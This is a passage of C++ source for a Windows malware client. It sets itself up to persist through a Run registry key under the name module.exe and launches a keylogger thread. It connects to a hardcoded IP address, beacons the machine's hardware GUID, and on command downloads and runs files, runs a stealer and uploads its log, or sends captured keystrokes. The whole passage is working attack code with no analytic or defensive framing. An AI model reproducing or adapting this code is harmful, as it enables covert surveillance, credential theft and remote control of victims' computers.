	SendFileToServer(archkeys);

	{
		DeleteFileA(archkeys);
	}

}

int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{

	int sizepath = 1000;
	int sizename = 512;

	wchar_t* programdata = (wchar_t*)malloc(sizepath);
	wchar_t* currentdir = (wchar_t*)malloc(sizepath);
	wchar_t* cfilename = (wchar_t*)malloc(sizename);

	SHGetFolderPathW(nullptr, 0x0023, nullptr, 0, programdata);
	GetModuleFileNameW(GetModuleHandleW(NULL), cfilename, sizename);

	wcscat(programdata, L"\\");
	wcscat(programdata, L"module.exe");

	if (wcscmp(cfilename, programdata) != 0)
	{
		if (!(PathFileExistsW(programdata)))
		{
			while (CopyFileW(cfilename, programdata, FALSE) == FALSE)
			{

			}

			{
				HKEY hkey = NULL;
				LONG createStatus = RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
				LONG status = RegSetValueExW(hkey, L"module", 0, REG_SZ, (BYTE*)programdata, (wcslen(programdata) + 1) * sizeof(wchar_t));
				RegCloseKey(hkey);

				STARTUPINFOW startupInfo = { 0 };
				startupInfo.cb = sizeof(startupInfo);
				PROCESS_INFORMATION processInfo = { 0 };
				CreateProcessW(NULL, programdata, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
				ExitProcess(0);
			}

		}
		else ExitProcess(0);
	}
	else {
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ClientKeyLoggerThread, NULL, NULL, NULL);

		WSAData wsaData;
		WORD DLLVersion = MAKEWORD(2, 1);
		WSAStartup(DLLVersion, &wsaData);

	connect:

		SOCKADDR_IN ServerAddr;
		SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		ServerAddr.sin_family = AF_INET;
		ServerAddr.sin_port = htons(80);
		ServerAddr.sin_addr.s_addr = inet_addr("178.159.42.207");

		{
			GetCurrentHwProfileA(&hwProfileInfo);
		}

		if (connect(SendingSocket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
		{

			{

				Sleep(5000);

				int sizeofguid = sizeof(char*) * strlen(hwProfileInfo.szHwProfileGuid);
				send(SendingSocket, (char*)&sizeofguid, sizeof(int), NULL);
				send(SendingSocket, hwProfileInfo.szHwProfileGuid, sizeofguid, NULL);

			}

			for (;;)
			{
				int res = 0;

				{

					recv(SendingSocket, (char*)&res, sizeof(int), NULL);

				}

				//он посылает сигнал типа онлайн ага
				if (res == 1)
				{

					int req = 1;
					send(SendingSocket, (char*)&req, sizeof(int), NULL);

				}
				else if (res == 2)
				{

					GetFileFromServerAndRun();

				}
				else if (res == 3)
				{

					RunStealerAndSendLog();

				}
				else if (res == 4)
				{

					GetKeyloggerResoult();

				}
				else {
					Sleep(5000);
					goto connect;
				}
			}
		}
		else {
			Sleep(5000);
			goto connect;
		}
	}
}